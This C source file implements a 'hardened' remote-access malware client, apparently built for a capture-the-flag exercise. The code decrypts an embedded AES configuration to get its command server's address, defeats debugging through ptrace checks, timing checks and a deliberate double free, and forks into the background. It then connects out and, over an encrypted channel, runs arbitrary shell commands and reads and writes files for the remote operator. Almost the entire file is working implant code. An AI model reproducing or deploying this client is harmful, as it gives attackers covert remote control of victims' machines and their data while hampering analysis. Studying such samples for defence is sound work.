// client.c - Hardened "Malware" Client
// Compile with: gcc client.c -o client -lmbedcrypto

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <arpa/inet.h>
#include <mbedtls/aes.h>
#include <mbedtls/md.h>

#define MAX_BUF_SIZE 4096
#define AES_BLOCK_SIZE 16
#define KEY_SIZE 32  // 256-bit key

// Encrypted configuration block - generated at build time
// Format: [server_addr, server_port, cmd_shell, cmd_read, cmd_write, cmd_exit, aes_key, aes_iv]
typedef struct {
    unsigned char data[512];
    size_t length;
} encrypted_config_t;

// This is the encrypted configuration that contains all our sensitive data
// Encrypted configuration block
const encrypted_config_t g_encrypted_config = {
    .data = {
        0xb8, 0xd0, 0xbe, 0xa0, 0xc5, 0xe5, 0x7f, 0x62, 0x81, 0xd1, 0x23, 0xd5, 0xd8, 0xdf, 0xc5, 0xe1,
        0x64, 0xe3, 0xc8, 0xd0, 0x10, 0x5b, 0x72, 0xff, 0xbd, 0x01, 0xcc, 0xb8, 0x2c, 0xe1, 0xc4, 0xb1,
        0x00, 0x7a, 0xa3, 0x43, 0x08, 0x63, 0x64, 0x64, 0xeb, 0x16, 0x2b, 0xf3, 0xa3, 0x58, 0x46, 0x67,
        0x7e, 0xa9, 0xc6, 0x1b, 0x74, 0x9f, 0x8b, 0x3f, 0x06, 0x32, 0x07, 0x74, 0xf0, 0x48, 0x46, 0x1c,
        0x12, 0xf9, 0xff, 0xe1, 0xfe, 0x35, 0xe3, 0x7c, 0x0f, 0x10, 0x5e, 0x4a, 0x78, 0x76, 0xb4, 0x54,
        0x1d, 0x0f, 0x84, 0x36, 0xd7, 0x51, 0x39, 0x15, 0xb9, 0x3b, 0x42, 0xa1, 0x3a, 0xeb, 0x02, 0xff
    },
    .length = 96
};



// Master key to decrypt the configuration (this is the only key that remains in plaintext)
// In a real scenario, this key could be derived through various runtime calculations
// or even split across multiple functions to make it harder to identify
const unsigned char master_key[KEY_SIZE] = {
    0xd6, 0x29, 0x87, 0x4c, 0xa5, 0xf3, 0x71, 0xb9,
    0xe8, 0x54, 0x32, 0x0f, 0xc1, 0x6a, 0xb5, 0x7d,
    0x91, 0x3e, 0x8a, 0x2c, 0xb4, 0x57, 0x69, 0xdf,
    0x3a, 0x84, 0x72, 0xf1, 0xc6, 0x9e, 0x4b, 0x25
};

// Config structure that will be decrypted at runtime
typedef struct {
    char server_addr[32];
    uint16_t server_port;
    char cmd_shell[16];
    char cmd_read[16];
    char cmd_write[16];
    char cmd_exit[16];
    unsigned char aes_key[KEY_SIZE];
    unsigned char aes_iv[AES_BLOCK_SIZE];
} config_t;

static config_t g_config;

// Anti-debugging mechanism with added evasion techniques
static inline int detect_debugger(void) {
    // Additional anti-debugging trick: check how many times this function is called
    static int call_count = 0;
    if (++call_count > 3) exit(0);  // Exit if called too many times
    
    // Fork and check for debugger
    pid_t child = fork();
    
    if (child == 0) {
        // Child process checks if it's being traced
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
            // If we can't trace ourselves, someone else is tracing us
            _exit(1);  // Use _exit to avoid flushing buffers
        }
        _exit(0);  // Child exits normally
    } else if (child > 0) {
        // Parent process
        int status;
        waitpid(child, &status, 0);
        
        // If child exit code was 1, a debugger was detected
        if (WEXITSTATUS(status) == 1) {
            // Anti-debugging detected; take evasive action
            // Obfuscate our exit by corrupting some memory first
            char *p = (char *)malloc(16);
            if (p) {
                memset(p, 0, 16);
                free(p);
                free(p);  // Double free to crash in an unexpected way
            }
            exit(0);
        }
    }
    
    // More anti-debugging: Insert timing checks
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Do some meaningless work that will take very different time under a debugger
    volatile int sum = 0;
    for (int i = 0; i < 1000; i++) sum += i;
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    long elapsed = (end.tv_sec - start.tv_sec) * 1000000000 + (end.tv_nsec - start.tv_nsec);
    
    if (elapsed > 10000000) { // 10ms - this would be much longer in a debugger
        exit(0);  // Silent exit if debugging detected
    }
	if (fork())
		_exit(0);
    
    return 0;
}

// Function to decrypt the configuration at runtime
int decrypt_config(void) {
    mbedtls_aes_context aes;
    unsigned char iv[AES_BLOCK_SIZE] = {
        0x35, 0x7c, 0x94, 0xaf, 0x66, 0xd2, 0x87, 0x15,
        0xc8, 0x4b, 0x9e, 0x23, 0x5d, 0x7a, 0xf1, 0xb8
    };
    unsigned char decrypted[512] = {0};
    
    // Initialize AES context
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_dec(&aes, master_key, KEY_SIZE * 8);
    
    // Decrypt configuration block
    for (size_t i = 0; i < g_encrypted_config.length; i += AES_BLOCK_SIZE) {
        mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_DECRYPT, AES_BLOCK_SIZE,
                             iv, g_encrypted_config.data + i, decrypted + i);
    }
    
    mbedtls_aes_free(&aes);
    
    // Parse the decrypted configuration
    char *ptr = (char *)decrypted;
    
    // Server address
    strncpy(g_config.server_addr, ptr, sizeof(g_config.server_addr) - 1);
    g_config.server_addr[sizeof(g_config.server_addr) - 1] = '\0';
    ptr += strlen(ptr) + 1;
    
    // Server port
    g_config.server_port = *((uint16_t *)ptr);
    ptr += sizeof(uint16_t);
    
    // Command strings
    strncpy(g_config.cmd_shell, ptr, sizeof(g_config.cmd_shell) - 1);
    g_config.cmd_shell[sizeof(g_config.cmd_shell) - 1] = '\0';
    ptr += strlen(ptr) + 1;
    
    strncpy(g_config.cmd_read, ptr, sizeof(g_config.cmd_read) - 1);
    g_config.cmd_read[sizeof(g_config.cmd_read) - 1] = '\0';
    ptr += strlen(ptr) + 1;
    
    strncpy(g_config.cmd_write, ptr, sizeof(g_config.cmd_write) - 1);
    g_config.cmd_write[sizeof(g_config.cmd_write) - 1] = '\0';
    ptr += strlen(ptr) + 1;
    
    strncpy(g_config.cmd_exit, ptr, sizeof(g_config.cmd_exit) - 1);
    g_config.cmd_exit[sizeof(g_config.cmd_exit) - 1] = '\0';
    ptr += strlen(ptr) + 1;
    
    // AES communication key
    memcpy(g_config.aes_key, ptr, KEY_SIZE);
    ptr += KEY_SIZE;
    
    // AES IV
    memcpy(g_config.aes_iv, ptr, AES_BLOCK_SIZE);
    
    return 0;
}

// Function to pad data to AES block size
size_t pad_data(unsigned char *input, size_t input_len, unsigned char *output) {
    size_t padded_len = (input_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE;
    size_t padding_len = padded_len - input_len;
    
    memcpy(output, input, input_len);
    // PKCS7 padding
    memset(output + input_len, padding_len, padding_len);
    
    return padded_len;
}

// Function to remove padding
size_t unpad_data(unsigned char *data, size_t data_len) {
    if (data_len == 0)
        return 0;
        
    unsigned char padding_val = data[data_len - 1];
    
    if (padding_val > AES_BLOCK_SIZE || padding_val == 0)
        return data_len; // Invalid padding, return as is
        
    // Verify padding
    for (size_t i = data_len - padding_val; i < data_len; i++) {
        if (data[i] != padding_val)
            return data_len; // Invalid padding, return as is
    }
    
    return data_len - padding_val;
}

// Function to encrypt data
size_t encrypt_data(unsigned char *plaintext, size_t plaintext_len, unsigned char *ciphertext) {
    mbedtls_aes_context aes;
    unsigned char padded_data[MAX_BUF_SIZE];
    size_t padded_len;
    
    // Pad data to AES block size
    padded_len = pad_data(plaintext, plaintext_len, padded_data);
    
    // Initialize AES context
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_enc(&aes, g_config.aes_key, KEY_SIZE * 8);
    
    // Encrypt data block by block
    unsigned char iv[AES_BLOCK_SIZE];
    memcpy(iv, g_config.aes_iv, AES_BLOCK_SIZE); // Use a copy of IV
    
    for (size_t i = 0; i < padded_len; i += AES_BLOCK_SIZE) {
        mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_ENCRYPT, AES_BLOCK_SIZE,
                             iv, padded_data + i, ciphertext + i);
    }
    
    mbedtls_aes_free(&aes);
    return padded_len;
}

// Function to decrypt data
size_t decrypt_data(unsigned char *ciphertext, size_t ciphertext_len, unsigned char *plaintext) {
    mbedtls_aes_context aes;
    
    // Initialize AES context
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_dec(&aes, g_config.aes_key, KEY_SIZE * 8);
    
    // Decrypt data block by block
    unsigned char iv[AES_BLOCK_SIZE];
    memcpy(iv, g_config.aes_iv, AES_BLOCK_SIZE); // Use a copy of IV
    
    for (size_t i = 0; i < ciphertext_len; i += AES_BLOCK_SIZE) {
        mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_DECRYPT, AES_BLOCK_SIZE,
                             iv, ciphertext + i, plaintext + i);
    }
    
    mbedtls_aes_free(&aes);
    
    // Remove padding
    return unpad_data(plaintext, ciphertext_len);
}

// Function to execute shell command and return result
void execute_shell_command(const char *cmd, char *output, size_t output_size) {
    FILE *fp;
    char buffer[128];
    
    // For the CTF challenge, we'll add a small fingerprint
    snprintf(output, output_size, "%s\n\n", cmd);
    size_t offset = strlen(output);
    
    // Execute the command
    fp = popen(cmd, "r");
    if (fp == NULL) {
        snprintf(output + offset, output_size - offset, ".");
        return;
    }
    
    // Read the output
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        if (offset + len < output_size) {
            memcpy(output + offset, buffer, len);
            offset += len;
        } else {
            break;
        }
    }
    
    output[offset] = '\0';
    pclose(fp);
}

// Function to read file
int read_file(const char *filepath, char *output, size_t output_size) {
    FILE *file = fopen(filepath, "rb");
    if (file == NULL) {
        snprintf(output, output_size, "%s", filepath);
        return -1;
    }
    
    size_t bytes_read = fread(output, 1, output_size - 1, file);
    output[bytes_read] = '\0';
    
    fclose(file);
    return 0;
}

// Function to write file
int write_file(const char *filepath, const char *content) {
    FILE *file = fopen(filepath, "wb");
    if (file == NULL) {
        return -1;
    }
    
    size_t bytes_written = fwrite(content, 1, strlen(content), file);
    fclose(file);
    
    return bytes_written == strlen(content) ? 0 : -1;
}

// Main client function
int main(int argc, char *argv[]) {
    
    // Check for debugging before critical operations
    detect_debugger();
    
    // Decrypt configuration
    decrypt_config();

    // More anti-debugging checks
    detect_debugger();
    
    int sock;
    struct sockaddr_in server_addr;
    unsigned char recv_buffer[MAX_BUF_SIZE];
    unsigned char decrypt_buffer[MAX_BUF_SIZE];
    unsigned char send_buffer[MAX_BUF_SIZE];
    unsigned char encrypt_buffer[MAX_BUF_SIZE];
    int bytes_received, bytes_sent;
    size_t decrypted_len, encrypted_len;
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    // Prepare server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(g_config.server_port);
    
    // Convert IPv4 address from text to binary
    if (inet_pton(AF_INET, g_config.server_addr, &server_addr.sin_addr) <= 0) {
        close(sock);
        return 0;
    }
    
    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return 0;
    }
    
    // Final anti-debugging check before main loop
    detect_debugger();
    
    // Main command loop
    while (1) {
        // Receive encrypted command length
        uint32_t cmd_len;
        if (recv(sock, &cmd_len, sizeof(cmd_len), 0) <= 0) {
            break;
        }
        cmd_len = ntohl(cmd_len);
        
        if (cmd_len > MAX_BUF_SIZE) {
            break;
        }
        
        // Receive encrypted command
        bytes_received = recv(sock, recv_buffer, cmd_len, 0);
        if (bytes_received <= 0) {
            break;
        }
        
        // Decrypt the command
        decrypted_len = decrypt_data(recv_buffer, bytes_received, decrypt_buffer);
        decrypt_buffer[decrypted_len] = '\0'; // Null-terminate
        
        char response[MAX_BUF_SIZE] = {0};
        
        // Process command
        if (strncmp((char *)decrypt_buffer, g_config.cmd_shell, strlen(g_config.cmd_shell)) == 0) {
            // Execute shell command
            const char *command = (char *)decrypt_buffer + strlen(g_config.cmd_shell) + 1;
            execute_shell_command(command, response, sizeof(response));
        }
        else if (strncmp((char *)decrypt_buffer, g_config.cmd_read, strlen(g_config.cmd_read)) == 0) {
            // Read file
            const char *filepath = (char *)decrypt_buffer + strlen(g_config.cmd_read) + 1;
            if (read_file(filepath, response, sizeof(response)) == 0) {
                snprintf(response + strlen(response), sizeof(response) - strlen(response),
                        "\n\n");
            } else {
                snprintf(response, sizeof(response), "%s", filepath);
            }
        }
        else if (strncmp((char *)decrypt_buffer, g_config.cmd_write, strlen(g_config.cmd_write)) == 0) {
            // Write file
            char *args = (char *)decrypt_buffer + strlen(g_config.cmd_write) + 1;
            char *space = strchr(args, ' ');
            
            if (space != NULL) {
                *space = '\0';
                const char *filepath = args;
                const char *content = space + 1;
                
                if (write_file(filepath, content) == 0) {
                    snprintf(response, sizeof(response), "%s", filepath);
                } else {
                    snprintf(response, sizeof(response), "%s", filepath);
                }
            } else {
                snprintf(response, sizeof(response), ".");
            }
        }
        else if (strncmp((char *)decrypt_buffer, g_config.cmd_exit, strlen(g_config.cmd_exit)) == 0) {
            // Exit command
            strcpy(response, ".");
            
            // Encrypt response
            encrypted_len = encrypt_data((unsigned char *)response, strlen(response), encrypt_buffer);
            
            // Send encrypted response length
            uint32_t len_to_send = htonl((uint32_t)encrypted_len);
            send(sock, &len_to_send, sizeof(len_to_send), 0);
            
            // Send encrypted response
            send(sock, encrypt_buffer, encrypted_len, 0);
            
            // Break the loop to exit
            break;
        }
        else {
            snprintf(response, sizeof(response), ".");
        }
        
        // Encrypt response
        encrypted_len = encrypt_data((unsigned char *)response, strlen(response), encrypt_buffer);
        
        // Send encrypted response length
        uint32_t len_to_send = htonl((uint32_t)encrypted_len);
        send(sock, &len_to_send, sizeof(len_to_send), 0);
        
        // Send encrypted response
        bytes_sent = send(sock, encrypt_buffer, encrypted_len, 0);
        if (bytes_sent <= 0) {
            break;
        }
    }
    
    // Close socket
    close(sock);
    return 0;
}
